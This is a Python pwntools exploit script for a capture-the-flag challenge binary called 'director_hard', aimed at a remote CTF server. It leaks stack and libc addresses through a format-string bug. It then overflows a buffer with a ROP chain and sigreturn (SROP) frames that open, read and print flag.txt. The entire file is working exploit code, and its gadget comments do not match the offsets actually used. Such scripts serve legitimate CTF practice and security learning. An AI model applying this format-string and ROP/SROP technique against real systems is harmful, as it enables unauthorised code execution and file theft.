#!/usr/bin/env python3
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h', '-F', '#{pane_pid}', '-P']
# Load binaries


glibc = ELF("./libc.so.6", checksec=False)


binary= ELF("./director_hard")

#p = process("./director_hard")

# Start process

#p = process("./director_hard_patched")
p=remote("challs.ctf.cert.unlp.edu.ar",48193)

#gdb.attach(p,"break *main+280")


#step 1: Leak libc address via format string
data = b"%p.%p.%p"




p.sendline(data)

p.recvuntil(b"You entered:")



leaks = p.recvline().strip().split(b".")

# Parse leaks


stack= int(leaks[0], 16)

log.info(f"stack : {hex(stack)}")


libc= int(leaks[2], 16)


log.info(f" libc : {hex(libc)}")

libc_base= libc-0xec8f7
log.info(f" libc_base : {hex(libc_base)}")
rbp= stack  +0x2230
log.info(f" rbp : {hex(rbp)}")


##################
###  GADGETS   ###
##################



'''

0x0000000000045eb0 : pop rax ; ret

0x000000000002a3e5 : pop rdi ; ret

0x000000000002be51 : pop rsi ; ret

0x0000000000029db4 : syscall

0x000000000003d1ee : pop rcx ; ret

0x000000000002be51 : mox eax 2 ; ret

'''
pop_rax= 0x1deb0+ libc_base 
pop_rdi= 0x23e5 + libc_base 
pop_rsi= 0x3e51 + libc_base
mov_eax= 0x2e713+ libc_base
syscall= 0x1db4 + libc_base

log.info(f"pop rdi : {hex(pop_rdi)} ")

offset=0x118


attack=b"flag.txt\x00"

padding=b"a"*(offset-len(attack))

#OPEN /SRC/FLAG.TXT 0

rop=p64(pop_rdi)

rop+=p64(rbp-0x110)

rop+=p64(pop_rsi)

rop+=p64(0)

rop+= p64(0xec550+ libc_base)

#READ FLAG INTO MEM

rop+=p64(pop_rax)
rop+=p64(0xf)

# READ 
read=0x0000000000401090


rop+=p64(syscall)
frame = SigreturnFrame()
frame.rax = 0 
frame.rdi = 3
frame.rsi = rbp 
frame.rdx = 0x100
frame.rsp = rbp + 0x140
frame.rip = read

rop+=bytes(frame)

rop+=p64(pop_rax)
rop+=p64(0xf)
#WRITE
rop+=p64(syscall)
frame2=SigreturnFrame()
frame2.rax = 1 
frame2.rdi = 1
frame2.rsi = rbp 
frame2.rdx = 0x100
frame2.rsp = rbp + 0x140
frame2.rip = syscall

rop+=bytes(frame2)


#rop+=p64(0xdeadcafe)
#rop+=p64(0xcafebabe)

#flag is at rbp
# WRITE TIME

#write=libc_base+0xec8e0

'''
rop+=p64(pop_rax)
rop+=p64(0xf)

rop+=p64(syscall)
frame = SigreturnFrame()
frame.rax = 0xdeadbeef 
frame.rdi = 0xdeadbeef
frame.rsi = rbp 
frame.rdx = 0x100
frame.rsp = rbp + 0x140
frame.rip = syscall

rop+=bytes(frame)
'''



payload=attack + padding + rop


#payload starts at rbp-0x110
 


p.sendline(payload)
p.interactive()
